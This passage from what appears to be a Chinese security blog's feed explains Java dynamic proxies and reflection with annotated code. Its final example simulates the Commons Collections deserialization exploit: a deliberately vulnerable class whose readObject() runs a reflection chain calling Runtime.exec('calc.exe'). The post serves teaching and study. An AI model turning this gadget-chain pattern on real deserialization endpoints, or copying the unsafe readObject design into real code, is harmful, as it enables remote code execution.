class="keyword">new</span> InternalError(e.toString(), e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            Throwable t = e.getCause();</span><br><span class="line">            <span class="keyword">if</span> (t <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (RuntimeException) t;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(t.toString(), t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(e.toString(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现只是封装了创建动态代理类的步骤。</p><p>重点关注”Class&lt;?&gt; cl = getProxyClass0(loader, intfs);”，其用于产生代理类，后面代码中的构造器也是通过这里产生的类来获得，因此可看出这个类的产生就是整个动态代理的关键。</p><p>JDK会生成一个叫$Proxy0的代理类，这个类文件是放在内存中的，在创建代理类对象时，通过反射机制获得这个类的构造方法，然后创建代理类实例。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>可以将InvocationHandler接口类看做一个中介类，中介类持有一个被代理对象即真实对象，在invoke()方法中调用了被代理对象相应的方法。通过聚合方式持有被代理对象的引用，把外部对invoke的调用最终都转为对被代理对象的调用。</p><p>代理类调用自己方法时，通过自身持有的中介类对象来调用中介类对象的invoke方法，从而达到代理执行被代理对象的方法。也就是说，动态代理通过中介类实现了具体的代理功能。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html" target="_blank" rel="noopener">java动态代理实现与原理详细分析</a></p><p><a href="https://www.cnblogs.com/xiaoluo501395377/p/3383130.html" target="_blank" rel="noopener">java的动态代理机制详解</a></p><p><a href="https://www.cnblogs.com/haodawang/p/5967185.html" target="_blank" rel="noopener">Java动态代理与反射详解</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Java动态代理机制主要通过反射机制来实现的，下面讲解一下动态代理相关内容。&lt;/p&gt;
&lt;h2 id=&quot;代理模式&quot;&gt;&lt;a href=&quot;#代理模式&quot; class=&quot;headerlink&quot; title=&quot;代理模式&quot;&gt;&lt;/a&gt;代理模式&lt;/h2&gt;&lt;p&gt;代理模式是Java中常用的设计模
      
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java反射机制</title>
    <link href="https://Mi1k7ea.github.com/2019/02/01/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <id>https://Mi1k7ea.github.com/2019/02/01/Java反射机制/</id>
    <published>2019-02-01T12:57:24.000Z</published>
    <updated>2019-02-11T14:07:13.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>反射机制定义：</strong>Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。</p><p>通俗点讲，通过反射，该类对我们来说是完全透明的，想要获取任何东西都可以。</p><p>要使用反射机制，就必须要先获取到该类的字节码文件对象(.class)，通过字节码文件对象，就能够通过该类中的方法获取到我们想要的所有信息(方法，属性，类名，父类名，实现的所有接口等等)，每一个类对应着一个字节码文件也就对应着一个Class类型的对象，也就是字节码文件对象。</p><h2 id="反射机制相关类库"><a href="#反射机制相关类库" class="headerlink" title="反射机制相关类库"></a>反射机制相关类库</h2><p>在Java中，Class类和java.lang.reflect类库一起构成了对反射机制的支持。其中最常使用到的类是Constructor，Field，Method，而这三个类都继承了一个接口java.lang.reflect.Member。下面列举介绍一下java.lang.reflect类库中的类：</p><ul><li>AccessibleObject：Field，Method，和Constructor对象的基类。提供了将反射的对象标记为在使用时取消默认Java语言访问控制检查的能力。</li><li>Array：提供了动态创建和访问Java数组的方法。</li><li>Constructor：提供关于类的单个构造方法的信息以及对它的访问权限。</li><li>Field： 提供有关类或接口的单个字段的信息，以及对它的动态访问权限。反射的字段可能是一个类（静态）字段或实例字段。</li><li>Method： 提供关于类或接口上单独某个方法（以及如何访问该方法）的信息。所反映的方法可能是类方法或实例方法（包括抽象方法）。</li><li>Modifier： 类提供了 static 方法和常量，对类和成员访问修饰符进行解码。修饰符集被表示为整数，用不同的位位置 (bit position) 表示不同的修饰符。该类的字段均是int类型的变量。 </li><li>Proxy： 提供用于创建动态代理类和实例的静态方法，它还是由这些方法创建的所有动态代理类的超类。</li><li>ReflectPermission：反射操作的 Permission 类。ReflectPermission 是一种指定权限，没有动作。当前定义的唯一名称是 suppressAccessChecks，它允许取消由反射对象在其使用点上执行的标准 Java 语言访问检查 - 对于 public、default（包）访问、protected、private 成员。</li></ul><p>当要使用反射机制去探查一个类的内部时，还可以调用getFields()，getMethods()和getConstructors()等很便利的方法。对于反射机制，和RTTI（Run-Time Type Information，运行时类型信息）的区别就在于，RTTI是在编译时打开和检查.class文件，而反射机制是在运行时打开和检查.class文件。</p><h2 id="获取类名称"><a href="#获取类名称" class="headerlink" title="获取类名称"></a>获取类名称</h2><p>通过反射机制获取类名称有三种方法：</p><p>1、Class clz = Class.forName(“com.test.User”);</p><p>2、Class clz = com.test.User.class;</p><p>3、User u = new User();  Class clz = u.getClass();</p><p>Demo示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clz1 = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">            System.out.println(<span class="string">"方法一："</span>);</span><br><span class="line">            System.out.println(clz1.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">"forName出错"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class clz2 = java.lang.ProcessBuilder.class;</span><br><span class="line">        System.out.println(<span class="string">"方法二："</span>);</span><br><span class="line">        System.out.println(clz2.getName());</span><br><span class="line"></span><br><span class="line">        java.lang.String s = <span class="string">""</span>;</span><br><span class="line">        Class clz3 = s.getClass();</span><br><span class="line">        System.out.println(<span class="string">"方法三："</span>);</span><br><span class="line">        System.out.println(clz3.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可从运行结果中看到分别获取了不同类名称：</p><p><img src="/2019/02/01/Java反射机制/1.png" alt="获取类名称"></p><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>通过Class创建对象：</p><p>Class clz = Class.forName(“com.test.User”);</p><p>User u = (User)clz.newInstane();//调用无参构造函数</p><p>Demo示例：</p><p>Uset.class定义User类，包含用户名和年龄：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.class中调用newInstane()创建对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class clz = User.class;</span><br><span class="line">        User user = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            user = (User)clz.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        user.setName(<span class="string">"Mi1k7ea"</span>);</span><br><span class="line">        user.setAge(<span class="number">6</span>);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从结果可看到创建了新的User类对象并成功赋值：</p><p><img src="/2019/02/01/Java反射机制/2.png" alt="创建对象"></p><h2 id="获取类对象属性"><a href="#获取类对象属性" class="headerlink" title="获取类对象属性"></a>获取类对象属性</h2><p>这里的属性指的是类定义的组成元素，如修饰符、方法名、成员变量等。</p><p><strong>获取所有的属性：</strong></p><p>Class clz = Class.forName(“com.test.User”);</p><p>Field [] fields = clz.getDeclaredFields();</p><p><strong>获取特定属性：</strong></p><p>Class clz = Class.forName(“com.test.User”);</p><p>Field [] fields = clz.getDeclaredField(“xxx”);//xxx为指定属性名</p><p>Demo示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clz = Class.forName(<span class="string">"User"</span>);</span><br><span class="line">            User user = (User)clz.newInstance();</span><br><span class="line">            Field[] fields = clz.getDeclaredFields();</span><br><span class="line">            System.out.println(<span class="string">"User类所有的属性："</span>);</span><br><span class="line">            <span class="keyword">for</span> (Field f : fields) &#123;</span><br><span class="line">                System.out.println(f);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Field field = clz.getDeclaredField(<span class="string">"name"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(user, <span class="string">"Mi1k7ea"</span>);</span><br><span class="line">            System.out.println(<span class="string">"\n修改的User类对象的name值为："</span>);</span><br><span class="line">            System.out.println(field.get(user));</span><br><span class="line">            System.out.println(<span class="string">"修改属性后的User类对象："</span>);</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">"forName出错"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可从结果看到调用获取了getDeclaredFields()所有Runtime类的属性，包括修饰符、方法名、成员变量等，同时也调用getDeclaredField()获取了指定的属性：</p><p><img src="/2019/02/01/Java反射机制/3.png" alt="获取类所有属性"></p><h2 id="应用示例"><a href="#应用示例" class="headerlink" title="应用示例"></a>应用示例</h2><h3 id="1、利用反射，在泛型为int的arryaList集合中存放一个String类型的对象"><a href="#1、利用反射，在泛型为int的arryaList集合中存放一个String类型的对象" class="headerlink" title="1、利用反射，在泛型为int的arryaList集合中存放一个String类型的对象"></a>1、利用反射，在泛型为int的arryaList集合中存放一个String类型的对象</h3><p>原理：集合中的泛型只在编译器有效，而到了运行期时泛型则会失效。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        list.add(<span class="number">1</span>);</span><br><span class="line">        list.add(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//        list.add("Mi1k7ea");//在编译器中泛型生效，插入字符串对象会报错</span></span><br><span class="line">        Class clz = list.getClass();</span><br><span class="line">        Method method = clz.getMethod(<span class="string">"add"</span>, Object.class);</span><br><span class="line">        method.invoke(list, <span class="string">"Mi1k7ea"</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到成功将String类型对象放入泛型为int型的数组中：</p><p><img src="/2019/02/01/Java反射机制/4.png" alt="示例1"></p><h3 id="2、利用反射，简化编写Servlet的个数"><a href="#2、利用反射，简化编写Servlet的个数" class="headerlink" title="2、利用反射，简化编写Servlet的个数"></a>2、利用反射，简化编写Servlet的个数</h3><p>利用反射机制，在为程序添加新功能时可以无需逐个对应编写新的Servlet，提高开发效率和代码简洁性。主要有如下两个方式优化。</p><p><strong>（1）、通过编写利用反射机制获取指定属性值的Servlet的方式</strong></p><p>每次从页面传过来一个参数，method=”xxx”; 然后编写一个Servlet，获得其参数method的值，进行判断，如果是add，则调用add方法，如果是delete，则调用delete方法，这样就可以写在一个servlet中实现所有的功能了。</p><p><img src="/2019/02/01/Java反射机制/5.png" alt="示例2"></p><p><strong>（2）、通过Servlet的生命周期即service()实现反射机制来实现</strong></p><p>编写一个通用的BaseServlet，继承于HttpServlet：</p><p><img src="/2019/02/01/Java反射机制/6.png" alt="示例3"></p><p>编写具体实现的方法Servlet类MyServlet001，继承于BaseServlet：</p><p><img src="/2019/02/01/Java反射机制/7.png" alt="示例4"></p><p>由Servlet的生命周期可知，在访问该Servlet时会调用service()方法，然而MyServlet001类中并无service()，因此会返回到父类BaseServlet中找到该service()方法，再获取参数从而知道需要调用的方法，因为方法的编写都在子类中，所以通过反射，获取到子类中对应的方法并运行，其中需要注意的是this这个参数在BaseServlet中的用法。</p><h3 id="3、利用反射，构造链式结构的反序列化漏洞利用payload"><a href="#3、利用反射，构造链式结构的反序列化漏洞利用payload" class="headerlink" title="3、利用反射，构造链式结构的反序列化漏洞利用payload"></a>3、利用反射，构造链式结构的反序列化漏洞利用payload</h3><p>在经典的Apache Commons Collections反序列化漏洞中，其payload的构造正是利用了反射机制来实现链式结构，将要执行的恶意代码构造成一条反射链，再通过包含自定义readObject()方法的类来触发执行。</p><p>这里简单模拟一下该反序列化漏洞场景，代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionPlay</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ReflectionPlay rp = <span class="keyword">new</span> ReflectionPlay();</span><br><span class="line">        rp.deserialize(rp.serialize(rp.getObject()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造链式结构的ReflectionChains类对象并复制到ReadObject类对象中，返回该恶意对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String command = <span class="string">"calc.exe"</span>;</span><br><span class="line">        Object firstObject = Runtime.class;</span><br><span class="line">        ReflectionObject[] reflectionChains = &#123;</span><br><span class="line">                <span class="comment">//调用Runtime.class的getMethod方法，寻找getRuntime方法，得到一个Method对象(getRuntime方法)</span></span><br><span class="line">                <span class="comment">//等同于Runtime.class.getMethod("getRuntime",new Class[]&#123;String.class,Class[].class&#125;)</span></span><br><span class="line">                <span class="keyword">new</span> ReflectionObject(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//调用Method的invoker方法可以得到一个Runtime对象，等同于method.invoke(null)，静态方法不用传入对象</span></span><br><span class="line">                <span class="keyword">new</span> ReflectionObject(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//调用RunTime对象的exec方法，并将command作为参数执行命令</span></span><br><span class="line">                <span class="keyword">new</span> ReflectionObject(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;command&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ReadObject(<span class="keyword">new</span> ReflectionChains(firstObject, reflectionChains));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//序列化对象到byte数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从byte数组中反序列化对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个有漏洞的类，主要提供的功能是根据自己属性中的值来进行反射调用</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReflectionObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String methodName;</span><br><span class="line">        <span class="keyword">private</span> Class[] paramTypes;</span><br><span class="line">        <span class="keyword">private</span> Object[] args;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ReflectionObject</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.methodName = methodName;</span><br><span class="line">            <span class="keyword">this</span>.paramTypes = paramTypes;</span><br><span class="line">            <span class="keyword">this</span>.args = args;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//根据methodName、paramTypes来寻找对象的方法，利用args作为参数进行调用</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            Class inputClass = input.getClass();</span><br><span class="line">            <span class="keyword">return</span> inputClass.getMethod(methodName, paramTypes).invoke(input, args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个反射链的类</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReflectionChains</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Object firstObject;</span><br><span class="line">        <span class="keyword">private</span> ReflectionObject[] reflectionObjects;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ReflectionChains</span><span class="params">(Object firstObject, ReflectionObject[] reflectionObjects)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.firstObject = firstObject;</span><br><span class="line">            <span class="keyword">this</span>.reflectionObjects = reflectionObjects;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历ReflectionObject类对象数组并调用其transform()方法</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            Object concurrentObject = firstObject;</span><br><span class="line">            <span class="keyword">for</span> (ReflectionObject reflectionObject : reflectionObjects) &#123;</span><br><span class="line">                concurrentObject = reflectionObject.transform(concurrentObject);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> concurrentObject;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个用于序列化与反序列化的类,拥有一个属性和一个重写了的readObject()方法，并且在readObject()方法中执行了该属性的一个方法</span></span><br><span class="line">    <span class="comment">//当反序列化该类对象时会执行自定义的readObject()方法</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReadObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> ReflectionChains reflectionChains;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ReadObject</span><span class="params">(ReflectionChains reflectionChains)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.reflectionChains = reflectionChains;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//自定义readObject()，当反序列化的时候，这个代码会被调用，且被调用的时候其属性都是空</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span></span></span><br><span class="line"><span class="function">                <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//用来模拟当readObject()的时候，对自身的属性进行了一些额外的操作，以符合反序列化漏洞特征</span></span><br><span class="line">                reflectionChains= (ReflectionChains) stream.readFields().get(<span class="string">"reflectionChains"</span>,<span class="keyword">null</span>);</span><br><span class="line">                reflectionChains.execute();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 